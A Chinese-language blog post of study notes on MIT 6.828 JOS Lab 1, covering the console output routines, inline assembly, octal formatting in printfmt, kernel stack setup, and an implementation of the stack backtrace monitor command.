<p><code>cputchar</code>调用的是 <code>cons_putc</code>, 所以 <code>cons_putc</code> 才是关键。 <code>cons_putc</code> 的功能是输出一个字符到控制台。<code>cons_putc</code> 又是由 <code>serial_putc</code>， <code>lpt_putc</code> 和 <code>cga_putc</code> 组成。</p>
<p>因此，要先来看 <code>serial_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> COM1        0x3F8</span>
<span class="token macro property">#<span class="token directive keyword">define</span> COM_LSR        5    </span><span class="token comment" spellcheck="true">// In:    Line Status Register</span>
<span class="token macro property">#<span class="token directive keyword">define</span>   COM_LSR_TXRDY    0x20    </span><span class="token comment" spellcheck="true">//   Transmit buffer avail</span>
<span class="token macro property">#<span class="token directive keyword">define</span> COM_TX        0    </span><span class="token comment" spellcheck="true">// Out: Transmit buffer (DLAB=0)</span>

<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">serial_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
         <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">inb</span><span class="token punctuation">(</span>COM1 <span class="token operator">+</span> COM_LSR<span class="token punctuation">)</span> <span class="token operator">&amp;</span> COM_LSR_TXRDY<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">12800</span><span class="token punctuation">;</span>
         i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">outb</span><span class="token punctuation">(</span>COM1 <span class="token operator">+</span> COM_TX<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>它控制的是端口0x3F8，inb 读取的是 COM1 + COM_LSR = 0x3FD 端口，outb 输出到了 COM1 + COM_TX = 0x3F8。</p>
<p>详细端口信息查看这个<a href="http://bochs.sourceforge.net/techspec/PORTS.LST" target="_blank" rel="external">PORTS.LST</a>。</p>
<p>在 inb(COM1 + COM_LSR) 之后， 有 &amp; COM_LSR_TXRDY 这个操作。 <code>!(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY)</code> 其实是为了查看读入的数据的第6位，也就是 PORTS.LST 中 03FD 中提到的 bit 5 是否为1。 如果为1，上面的语句结果就是0，停止for循环。这个 bit 5 是判断发送数据缓冲寄存器是否为空。</p>
<p>outb 是将端口 0x3F8 的内容输出到 c。当 0x3F8 被写入数据，它作为发送数据缓冲寄存器，数据是要发给串口。</p>
<p>所以serial_putc是为了把一个字符输出到串口。</p>
<p>再来看 <code>lpt_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/***** Parallel port output code *****/</span>
<span class="token comment" spellcheck="true">// For information on PC parallel port programming, see the class References</span>
<span class="token comment" spellcheck="true">// page.</span>

<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">lpt_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">inb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">12800</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token operator">|</span><span class="token number">0x04</span><span class="token operator">|</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>将字符给并口设备。</p>
<p>最后一个是 <code>cga_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">cga_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// if no attribute given, then use black on white</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        c <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x0700</span><span class="token punctuation">;</span>

    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'\b'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            crt_pos<span class="token operator">--</span><span class="token punctuation">;</span>
            crt_buf<span class="token punctuation">[</span>crt_pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'\n'</span><span class="token punctuation">:</span>
        crt_pos <span class="token operator">+</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/* fallthru */</span>
    <span class="token keyword">case</span> <span class="token string">'\r'</span><span class="token punctuation">:</span>
        crt_pos <span class="token operator">-</span><span class="token operator">=</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">%</span> CRT_COLS<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'\t'</span><span class="token punctuation">:</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        crt_buf<span class="token punctuation">[</span>crt_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* write the character */</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// What is the purpose of this?</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">>=</span> CRT_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> i<span class="token punctuation">;</span>

        <span class="token function">memmove</span><span class="token punctuation">(</span>crt_buf<span class="token punctuation">,</span> crt_buf <span class="token operator">+</span> CRT_COLS<span class="token punctuation">,</span> <span class="token punctuation">(</span>CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint16_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> CRT_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            crt_buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0700</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
        crt_pos <span class="token operator">-</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* move that little blinky thing */</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> crt_pos <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> crt_pos<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>首先 <code>!(c &amp; ~0xFF)</code> 是否在 0 ~ 255 之前。<code>\b</code>很容易理解，就是退格键，让缓冲区 <code>crt_buf</code> 的下标 <code>crt_pos</code> 减1。其他的同理，case都是格式操作。default就是往缓冲区里写入字符c。之后就是当缓存超过CRT_SIZE，就是用 <code>memmove</code> 复制内存内容。</p>
<p>最后四句代码是将缓冲区的内容输出到显示屏。</p>
<h3 id="u5185_u8054_u6C47_u7F16tips"><a href="#u5185_u8054_u6C47_u7F16tips" class="headerlink" title="内联汇编tips"></a>内联汇编tips</h3><p>这里提一下内联汇编。 <code>inb</code> 和 <code>outb</code> 都是内联汇编。其中 <code>inb</code> 函数</p>
<pre class=" language-c"><code class="language-c"><span class="token function">inb</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    uint8_t data<span class="token punctuation">;</span>
    __asm <span class="token function">__volatile</span><span class="token punctuation">(</span><span class="token string">"inb %w1,%0"</span> <span class="token punctuation">:</span> <span class="token string">"=a"</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">"d"</span> <span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p> “__asm__“表示后面的代码为内联汇编， “__volatile__“表示编译器不要优化代码。括号里是汇编指令。</p>
<p>内联汇编的模板是：__asm__(汇编语句模板: 输出部分: 输入部分: 破坏描述部分)。 共四个部分：汇编语句模板，输出部分，输入部分，破坏描述部分，各部分使用”:”格开，汇编语句模板必不可少， 其他三部分可选，如果使用了后面的部分，而前面部分为空，也需要用”:”格开，相应部分内容为空。如上面程序则只是用了前三部分。</p>
<p>“inb %w1,%0”表示汇编语句模板， “=a” (data)是输出部分，”d” (port)是输入部分。本例中只有两个：“data” 和“port”，他们按照出现的顺序分别与指令操作数 “%0”,“%1”对应。每个输出操作数的限定字符串必须包含“=”表示他是一个输出操作数。例如”=a” (data)就是一个输出操作数，其限定字符串为”=a”，(data)就是C语言变量。</p>
<p>之后来看 <code>lib/printfmt.c</code> 的代码。首先来看 <code>kern/printf.c</code> 里提到的 <code>vprintfmt</code>函数。</p>
<p>代码太长了，简单点先说一下它的四个输入参数。</p>
<ul>
<li>void (*putch)(int, void*) 函数指针，一般调用输出到屏幕上的函数</li>
<li>void *putdat 输入字符要放的内存地址指针</li>
<li>const char *fmt 格式化字符串</li>
<li>va_list ap 多个输入参数</li>
</ul>
<p>在vprintf里传入的参数putdat是cnt的地址，cnt是用来做计数器的。cprintf功能类似。</p>
<p>分析完三个文件，回到题目，要去实现%o的格式化输出。在 <code>lib/printfmt.c</code> 可以看到要填写的地方。参考上面 <code>case &#39;u&#39;</code> 的写法。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token string">'o'</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token function">getuint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ap<span class="token punctuation">,</span> lflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    base <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> number<span class="token punctuation">;</span>
</code></pre>
<p>修改完以后保存，<code>make clean</code> 之后运行，会发现启动以后，qemu里JOS启动时会出现这样一行字。</p>
<p><img src="16.png" alt=""></p>
<p>第一行完成了6828转八进制。</p>
<p>解释 <code>console.c</code> 中的这段代码</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">>=</span> CRT_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token function">memmove</span><span class="token punctuation">(</span>crt_buf<span class="token punctuation">,</span> crt_buf <span class="token operator">+</span> CRT_COLS<span class="token punctuation">,</span> <span class="token punctuation">(</span>CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint16_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> CRT_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        crt_buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0700</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
    crt_pos <span class="token operator">-</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>简单点说就是当字符长度超过CRT_SIZE， 证明屏幕放不下了，需要页面向上滚动一行。</p>
<p>观察下面的代码，分析fmt和ap指向什么。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> z <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"x %d, y %x, z %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>fmt 指向的是格式字符串 “x %d, y %x, z %d\n”，ap 指向的是参数 x, y, z。<br>将这段代码加入到 <code>kern\monitor.c</code> 并重新编译运行，即可显示结果。</p>
<p>运行这段代码。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span>
<span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>输出是 <code>He110 World</code>。 这很神奇。首先 %x 是指十六进制，所以将 57616 转为十六进制就是 <code>e110</code>。在看后面， &amp;i 是指 i 的地址， %s是指输出为字符串，所以输出的应该是变量i所在地址的字符串。其实就是将i转换为字符串来输出。因为x86是小端模式，并且是int类型，所以存放的方式是四个字节，所以就会将i拆分开来，变成 0x72, 0x6c, 0x64, 0x00. 所以转换为字符就是rld\0，所以得到了上面的输出结果。</p>
<p>运行以下代码。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>结果是 <code>x=3 y=-267380708</code>，y出问题是因为没有被指定值，所以输出的是一个不确定的值。</p>
<h3 id="u5806_u6808"><a href="#u5806_u6808" class="headerlink" title="堆栈"></a>堆栈</h3><p>最后这部分，要研究C语言是如何在x86框架上使用堆栈的。需要查看指令寄存器(IP)的值的变化。</p>
<h4 id="Exercise_9"><a href="#Exercise_9" class="headerlink" title="Exercise 9"></a>Exercise 9</h4><p>研究内核是在哪初始化堆栈，找出堆栈存放在内存的位置。内核是如何保存一块空间给堆栈的？堆栈指针指向这块区域的哪儿？</p>
<p>看了几个文件以后，发现在 <code>kern/entry.S</code> 中提到了设置堆指针和栈指针。</p>
<pre><code>    # Clear the frame pointer register (EBP)
    # so that once we get into debugging C code,
    # stack backtraces will be terminated properly.
    movl    $0x0,%ebp            # nuke frame pointer

    # Set the stack pointer
    movl    $(bootstacktop),%esp
</code></pre><p>为了查看堆的位置，所以要使用gdb，同样还是 <code>b *0x10000c</code> 打断点进入 entry。 si 一步步执行，在 <code>0x10002d:    jmp    *%eax</code> 之后，下一条指令变为 <code>0xf010002f &lt;relocated&gt;:    mov    $0x0,%ebp</code>。其实地址应该还是 0x10002f，所以这里的 0xf010002f 是因为开启的虚拟地址。</p>
<p>通过 gdb 发现 <code>0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp</code>， 也就是说%esp也就是bootstacktop的值为0xf0110000。其中 <code>kern/entry.S</code> 的 <code>KSTKSIZE</code> 应该就是堆栈的大小，通过跳转，发现在 <code>inc/memlayout.h</code> 里提到了堆栈。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Kernel stack.</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTACKTOP    KERNBASE</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTKSIZE    (8*PGSIZE)           </span><span class="token comment" spellcheck="true">// size of a kernel stack</span>
<span class="token macro property">#<span class="token directive keyword">define</span> KSTKGAP        (8*PGSIZE)           </span><span class="token comment" spellcheck="true">// size of a kernel stack guard</span>
</code></pre>
<p><code>PGSIZE</code> 定义在 <code>inc/mmu.h</code> 中，值为 4096，所以 KSTKSIZE 为 32KB。 使用 <code>info registers</code> 可以查出esp和ebp的值。最高地址为bootstacktop的值，也就是0xf0110000。</p>
<p>x86堆栈指针(esp寄存器)指向堆栈正在使用的最低位置，低于这个位置的空间还没使用。ebp寄存器(基址指针寄存器)与程序有关。详细的内容可以看 CSAPP。</p>
<h4 id="Exercise_10"><a href="#Exercise_10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><p>研究 <code>obj/kern/kernel.asm</code> 中 test_backtrace 向堆栈里压入的信息。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Test the stack backtrace function (lab 1 only)</span>
<span class="token keyword">void</span>
<span class="token function">test_backtrace</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"entering test_backtrace %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">test_backtrace</span><span class="token punctuation">(</span>x<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">mon_backtrace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"leaving test_backtrace %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>使用单步调试和 info registers 来查看esp和ebp的变化。</p>
<p>运行test_backtrace前，</p>
<pre><code>esp            0xf010ffdc    0xf010ffdc
ebp            0xf010fff8    0xf010fff8
</code></pre><p>执行的操作为</p>
<pre><code>0xf0100040 &lt;test_backtrace&gt;:    push   %ebp  #栈底指针ebp压入栈中
0xf0100041 &lt;test_backtrace+1&gt;:    mov    %esp,%ebp  #将栈顶指针esp指向栈底指针ebp
0xf0100043 &lt;test_backtrace+3&gt;:    push   %ebx  #压入ebx基底寄存器
0xf0100044 &lt;test_backtrace+4&gt;:    sub    $0xc,%esp  #栈顶指针esp向低地址移动0xc也就是12bytes。
0xf0100047 &lt;test_backtrace+7&gt;:    mov    0x8(%ebp),%ebx  
0xf010004a:    53                       push   %ebx #将%ebp+8位置的变量压入栈中，为之后的调用做准备。
</code></pre><p>总之，这段程序算是递归，递归就是ebp存放返回地址，esp是存放调用时的参数。</p>
<p>现在需要实现mon_backtrace()这个函数，需要显示ebp，eip 和 args。ebp是基址指针，eip是返回指令指针。</p>
<p>简单实现backtrace，实现效果如下</p>
<p><img src="17.png" alt=""></p>
<p>实现如下。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">mon_backtrace</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Your code here.</span>
    <span class="token keyword">int</span> j<span class="token punctuation">;</span>
    uint32_t ebp <span class="token operator">=</span> <span class="token function">read_ebp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint32_t eip <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"Stack backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ebp <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"  ebp:0x%08x eip:0x%08x args:"</span><span class="token punctuation">,</span> ebp<span class="token punctuation">,</span> eip<span class="token punctuation">)</span><span class="token punctuation">;</span>
        uint32_t <span class="token operator">*</span>args <span class="token operator">=</span> <span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> j <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"%08x "</span><span class="token punctuation">,</span> args<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        eip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        ebp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t <span class="token operator">*</span><span class="token punctuation">)</span>ebp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="Exercise_11"><a href="#Exercise_11" class="headerlink" title="Exercise 11"></a>Exercise 11</h4><p>修改上面实现的backtrace，要显示详细的函数地址。可以使用 <code>kern/kdebug.c</code> 的 debuginfo_eip()。在查看debuginfo_eip时发现其中有一段代码需要填写。这段代码是填写eip_line。这里用到了写好的二分查找。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Search within [lline, rline] for the line number stab.</span>
    <span class="token comment" spellcheck="true">// If found, set info->eip_line to the right line number.</span>
    <span class="token comment" spellcheck="true">// If not found, return -1.</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Hint:</span>
    <span class="token comment" spellcheck="true">//    There's a particular stabs type used for line numbers.</span>
    <span class="token comment" spellcheck="true">//    Look at the STABS documentation and &lt;inc/stab.h> to find</span>
    <span class="token comment" spellcheck="true">//    which one.</span>
    <span class="token comment" spellcheck="true">// Your code here.</span>
    <span class="token function">stab_binsearch</span><span class="token punctuation">(</span>stabs<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lline<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rline<span class="token punctuation">,</span> N_SLINE<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>lline <span class="token operator">&lt;=</span> rline<span class="token punctuation">)</span><span class="token punctuation">{</span>
        info<span class="token operator">-></span>eip_line <span class="token operator">=</span> stabs<span class="token punctuation">[</span>rline<span class="token punctuation">]</span><span class="token punctuation">.</span>n_desc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
        info<span class="token operator">-></span>eip_line <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre>
<p>关于 stab 相关内容，查看第三个参考资料，实话说，我对于stab理解的比较模糊。</p>
<h4 id="Exercise_12"><a href="#Exercise_12" class="headerlink" title="Exercise 12"></a>Exercise 12</h4><p>将backtrace嵌入终端中，使其可以被调用。只需要修改 <code>kern/monitor.c</code> 的</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> Command commands<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span> <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"Display this list of commands"</span><span class="token punctuation">,</span> mon_help <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> <span class="token string">"kerninfo"</span><span class="token punctuation">,</span> <span class="token string">"Display information about the kernel"</span><span class="token punctuation">,</span> mon_kerninfo <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> <span class="token string">"backtrace"</span><span class="token punctuation">,</span> <span class="token string">"Display a listing of function call frames"</span><span class="token punctuation">,</span> mon_backtrace<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="u6700_u540E_u7684_u6700_u540E"><a href="#u6700_u540E_u7684_u6700_u540E" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>至此,lab1已经算是完成了，简单了解了操作系统的启动过程，很充实很值得思考。</p>
<p><img src="18.png" alt=""></p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://blog.chinaunix.net/uid-24585655-id-2125525.html" target="_blank" rel="external">AT&amp;T_GCC_ASM简单介绍</a></p>
<p><a href="http://blog.csdn.net/roger__wong/article/details/8623941" target="_blank" rel="external">JOS学习笔记（四）</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[算法导论动态规划学习]]></title>
      <url>http://xinqiu.me/2016/10/04/CLRS-2/</url>
      <content type="html"><![CDATA[<script type="text/x-mathjax-config">
